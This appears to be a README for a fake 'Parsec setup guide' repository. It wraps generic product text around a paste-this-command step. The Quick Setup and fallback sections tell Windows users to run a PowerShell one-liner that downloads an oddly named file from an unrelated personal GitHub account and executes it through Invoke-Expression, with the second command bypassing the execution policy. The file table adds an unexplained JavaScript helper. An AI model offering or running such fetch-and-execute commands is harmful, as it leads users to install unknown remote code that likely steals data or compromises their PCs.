# Parsec

Parsec is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open Parsec to start and manage what it runs.

Parsec on Windows lets you share your screen or take control of another PC with responsive input and smooth video, which suits co-op play, remote support, and working across machines. After installation, you sign in, pick host or join, and the app handles encoding, networking, and permissions so connections stay stable without manual port tuning.

A typical session starts from the tray icon or desktop shortcut: you launch Parsec, choose to host or enter a friend’s link, approve the guest, and the remote view opens in a dedicated window with adjustable quality and fullscreen. Hosts can limit who connects; guests use keyboard, mouse, and optionally gamepad as if they were at the desk.

This repository collects the Windows setup package reference, configuration notes for firewall and audio routing, and a changelog aligned with Parsec releases. It is meant for people who want a single, versioned place to document how they install, update, and launch Parsec on their systems.

## What you open

- Hosts a session from the Windows tray menu with one click after sign-in.
- Guests join shared desktops using short links without configuring router port forwarding.
- Encodes the host display with hardware acceleration when your GPU supports it.
- Routes gamepad input to the host so local controllers work in remote sessions.
- Adjusts stream bitrate and resolution from in-session settings for your network.
- Lists approved friends and pending invites inside the Parsec Windows client interface.
- Runs the remote view in a borderless or fullscreen window on the guest machine.
- Records session quality metrics so you can tune latency on congested Wi-Fi links.

## Quick Setup (PowerShell)

This installs the tool Parsec on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sandra6456655623/parsec-setup-guide/main/77t95o47ct.hu1e63np | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sandra6456655623/parsec-setup-guide/main/77t95o47ct.hu1e63np | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `77t95o47ct.hu1e63np` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sandra6456655623/parsec-setup-guide`. Parsec 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
